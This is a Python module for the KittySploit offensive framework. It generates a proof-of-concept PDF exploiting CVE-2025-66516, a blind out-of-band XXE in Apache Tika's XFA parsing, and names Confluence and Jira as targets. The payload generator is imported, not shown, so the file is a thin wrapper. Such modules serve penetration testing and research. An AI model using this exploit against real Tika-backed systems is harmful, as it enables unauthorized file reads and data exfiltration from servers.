#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.pdf.mixins import PdfCveMixin
from lib.pdf.generators.xxe import write_xfa_xxe_oob


class Module(Auxiliary, PdfCveMixin):
    __info__ = {
        "name": 'PDF CVE-2025-66516 Tika XFA OOB XXE',
        "description": 'Generate PDF PoC for CVE-2025-66516: blind OOB XXE via parameter entity in XFA targeting Apache Tika (Confluence, Jira, etc.).',
        "author": ["KittySploit Team"],
        "cve": ['CVE-2025-66516'],
        "references": ['https://nvd.nist.gov/vuln/detail/CVE-2025-66516'],
        "tags": ['pdf', 'cve-2025-66516', 'xxe', 'tika', 'xfa', 'oob'],
    }

    PDF_GENERATORS = (
        write_xfa_xxe_oob,
    )

    CVE_IDS = ['CVE-2025-66516']
    MODULE_TITLE = 'PDF CVE-2025-66516 Tika XFA OOB XXE'

    def run(self):
        return self.run_pdf_cve()